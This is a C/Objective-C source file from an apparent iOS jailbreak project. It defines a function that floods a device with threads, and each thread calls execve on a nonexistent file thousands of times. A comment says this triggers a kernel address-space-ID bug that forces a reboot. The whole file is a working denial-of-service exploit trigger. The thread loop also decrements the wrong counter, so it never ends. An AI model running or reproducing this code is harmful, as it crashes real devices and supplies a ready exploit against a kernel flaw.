//
//  reboot.c
//  jailbreak112
//
//  Created by Sem Voigtländer on 11/04/2018.
//  Copyright © 2018 Jailed Inc. All rights reserved.
//

#include "reboot.h"
#import <Foundation/Foundation.h>
void rebootDevice()
{
    int THREADS = 10000;
    int ATTEMPTS = 10000;
    while(THREADS>0)
    {
        [NSThread detachNewThreadWithBlock:^(void){
         for(int i = 0; i < 10000; i++)
         {
             char* env = NULL;
             char* arg[] = {"", NULL};
             //The bug occurs here
             execve("/non/existant/file", arg, &env); //alloc_asid, asidnum++
         }
         printf("A thread has finished.\n");
         }];
        ATTEMPTS--;
    }
    printf("If we still out here we might have to conclude the bug has failed and we cannot reboot\n");

}
